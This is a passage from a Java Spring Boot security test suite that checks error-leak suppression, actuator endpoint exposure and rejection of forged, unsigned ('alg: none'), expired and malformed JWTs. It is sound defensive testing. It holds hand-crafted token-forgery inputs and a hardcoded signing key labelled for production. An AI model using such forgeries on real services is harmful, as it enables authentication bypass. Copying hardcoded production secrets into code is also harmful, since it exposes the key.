        assertThat(errorBody).doesNotContain("at org.springframework");
        assertThat(errorBody).doesNotContain("at com.livo.api");
        assertThat(errorBody).doesNotContain("SELECT ");
        assertThat(errorBody).doesNotContain("org.postgresql");

        // 3. Actuator Public Exposure Check: /actuator/health is allowed, sensitive endpoints blocked
        mockMvc.perform(get("/actuator/health"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));

        mockMvc.perform(get("/actuator/env"))
                .andExpect(status().isNotFound());
        mockMvc.perform(get("/actuator/heapdump"))
                .andExpect(status().isNotFound());
    }

    // =========================================================================
    // 10. JWT TAMPERING, FORGERY & ALGORITHM CONFUSION
    // =========================================================================

    @Test
    @DisplayName("Audit 10: JWT Security - Forged signatures, algorithm none, and expired tokens are rejected with 401")
    void testJwtTamperingAndForgery() throws Exception {
        TestUser user = createTestUser("jwt_audit");

        // 1. Manipulated HMAC signature (signed with an arbitrary attacker secret)
        var fakeKey = Keys.hmacShaKeyFor("attacker-secret-key-that-is-at-least-256-bits-long-1234567890".getBytes(StandardCharsets.UTF_8));
        String forgedToken = Jwts.builder()
                .setSubject(user.id().toString())
                .claim("email", user.email())
                .claim("type", "access")
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + 3600000))
                .signWith(fakeKey, SignatureAlgorithm.HS256)
                .compact();

        mockMvc.perform(get("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + forgedToken))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.success").value(false));

        // 2. Algorithm confusion / Unsigned Token ('alg: none')
        String unsignedToken = Base64.getUrlEncoder().withoutPadding().encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes(StandardCharsets.UTF_8))
                + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(("{\"sub\":\"" + user.id() + "\",\"type\":\"access\"}").getBytes(StandardCharsets.UTF_8))
                + ".";

        mockMvc.perform(get("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + unsignedToken))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.success").value(false));

        // 3. Expired Token from year 2020
        var realKey = Keys.hmacShaKeyFor("livo-super-secret-jwt-signing-key-for-production-environment-2026-minimum-256-bits".getBytes(StandardCharsets.UTF_8));
        String expiredToken = Jwts.builder()
                .setSubject(user.id().toString())
                .claim("email", user.email())
                .claim("type", "access")
                .setIssuedAt(new Date(1577836800000L)) // 2020-01-01
                .setExpiration(new Date(1577840400000L))
                .signWith(realKey, SignatureAlgorithm.HS256)
                .compact();

        mockMvc.perform(get("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer " + expiredToken))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.success").value(false));

        // 4. Malformed Token String
        mockMvc.perform(get("/api/v1/tasks")
                        .header(HttpHeaders.AUTHORIZATION, "Bearer not.a.valid.jwt.payload.with.extra.dots"))
                .andExpect(status().isUnauthorized())
                .andExpect(jsonPath("$.success").value(false));
    }
}
